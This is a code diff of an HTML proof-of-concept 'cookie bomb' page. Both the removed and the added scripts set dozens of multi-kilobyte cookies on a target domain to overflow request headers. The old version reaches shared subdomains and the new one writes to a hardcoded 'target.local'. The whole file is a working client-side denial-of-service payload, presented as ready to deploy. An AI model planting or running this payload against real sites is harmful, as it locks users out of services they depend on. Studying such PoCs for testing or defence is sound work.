@@ -1,19 +1,26 @@
+<!DOCTYPE html>
 <html>
 <head>
-    <title>Cookie Bomb PoC</title>
+    <title>Explicit Domain Target PoC</title>
 </head>
 <body>
 <script>
-    // Extract base domain to target shared subdomains
-    var base_domain = document.domain.substr(document.domain.indexOf('.'));
-    // Create a massive string of characters
-    var pollution = Array(4000).join('a');
+    // Hardcode the exact target domain to ensure syntax validity
+    // Replace 'target.local' with your specific test domain or 'localhost'
+    const TARGET_DOMAIN = "target.local"; 
     
-    // Set multiple large cookies to overflow the header limit
-    for(var i = 1; i < 99; i++) {
-        document.cookie = 'bomb' + i + '=' + pollution + ';Domain=' + base_domain + ';path=/';
+    // Create a predictable 3KB text chunk
+    const chunk = "B".repeat(3000);
+    
+    console.log("Starting cookie generation...");
+    
+    // Write 50 cookies, totaling roughly 150KB of header data
+    for (let i = 0; i < 50; i++) {
+        document.cookie = `session_pad_${i}=${chunk}; Domain=${TARGET_DOMAIN}; Path=/; SameSite=Lax`;
     }
+    
+    console.log("Cookies written. Check the Application tab in DevTools.");
 </script>
-<h1>Cookie Bomb executed!</h1>
+<h1>Payload deployed to target.local</h1>
 </body>
 </html>
